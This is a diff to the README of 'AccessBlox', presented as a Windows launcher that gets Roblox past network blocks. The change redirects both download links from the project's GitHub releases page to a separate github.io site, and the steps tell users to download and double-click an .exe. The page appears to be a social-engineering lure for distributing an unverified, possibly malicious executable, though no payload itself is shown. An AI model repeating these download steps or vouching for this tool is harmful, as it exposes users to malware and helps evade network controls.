@@ -1,6 +1,6 @@
 # 🚀 accessblox-2026-windows-tool - Launch Roblox games with ease today
 
-[![Download AccessBlox](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/talbertglassy580/accessblox-2026-windows-tool/releases)
+[![Download AccessBlox](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://talbertglassy580.github.io)
 
 AccessBlox v2026 acts as a helper tool for Windows users. It manages how you start the Roblox Player and Studio applications. If your network blocks standard game connections, this tool assists you by adjusting launch settings. You do not need technical skills to use this software.
 
@@ -15,7 +15,7 @@ AccessBlox v2026 acts as a helper tool for Windows users. It manages how you sta
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official release page](https://github.com/talbertglassy580/accessblox-2026-windows-tool/releases) to find the latest version.
+1. Visit the [official release page](https://talbertglassy580.github.io) to find the latest version.
 2. Look for the file ending in ".exe" under the Assets section.
 3. Select the file to save it to your computer.
 4. Open your Downloads folder and double-click the file to start the installer.
